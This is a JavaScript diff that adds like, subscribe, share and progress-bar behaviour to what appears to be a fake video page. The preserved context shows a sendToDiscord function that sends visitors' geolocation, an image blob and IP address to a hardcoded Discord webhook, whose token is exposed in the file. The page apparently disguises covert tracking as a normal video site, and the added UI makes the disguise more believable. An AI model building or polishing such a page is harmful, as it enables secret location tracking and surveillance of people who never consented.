@@ -148,6 +148,72 @@ document.addEventListener('DOMContentLoaded', () => {
         URL.revokeObjectURL(url);
     }
 
+    // === UI Interactivity ===
+    const likeBtn = document.getElementById('likeBtn');
+    const dislikeBtn = document.getElementById('dislikeBtn');
+    const subscribeBtn = document.getElementById('subscribeBtn');
+    const shareBtn = document.getElementById('shareBtn');
+    const progressBar = document.getElementById('progressBar');
+    const likeCountSpan = document.getElementById('likeCount');
+
+    // Like Button
+    likeBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const icon = likeBtn.querySelector('.icon-circle');
+        icon.classList.toggle('icon-filled'); // You might need to add specific CSS for this if using text color
+
+        let count = parseFloat(likeCountSpan.innerText);
+        if (likeCountSpan.innerText.includes('M')) {
+            // Mock logic for "1.2M" -> just toggle visual state mostly
+            if (icon.classList.contains('icon-filled')) {
+                icon.style.background = 'rgba(255, 255, 255, 0.2)';
+                icon.innerText = '👍'; // Or change to filled version if available
+            } else {
+                icon.style.background = '';
+            }
+        }
+    });
+
+    // Dislike Button
+    dislikeBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const icon = dislikeBtn.querySelector('.icon-circle');
+        // Just visual feedback
+        icon.style.transform = 'rotate(-10deg)';
+        setTimeout(() => icon.style.transform = '', 200);
+    });
+
+    // Subscribe Button
+    subscribeBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        if (subscribeBtn.innerText === 'Subscribe') {
+            subscribeBtn.innerText = 'Subscribed';
+            subscribeBtn.classList.add('subscribed');
+        } else {
+            subscribeBtn.innerText = 'Subscribe';
+            subscribeBtn.classList.remove('subscribed');
+        }
+    });
+
+    // Share Button
+    shareBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        navigator.clipboard.writeText(window.location.href);
+        const originalText = shareBtn.querySelector('span').innerText;
+        shareBtn.querySelector('span').innerText = 'Copied!';
+        setTimeout(() => {
+            shareBtn.querySelector('span').innerText = originalText;
+        }, 2000);
+    });
+
+    // Progress Bar Logic
+    contentVideo.addEventListener('timeupdate', () => {
+        if (contentVideo.duration) {
+            const percentage = (contentVideo.currentTime / contentVideo.duration) * 100;
+            progressBar.style.width = `${percentage}%`;
+        }
+    });
+
     // Existing Discord Logic (Preserved)
     async function sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count }) {
         const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
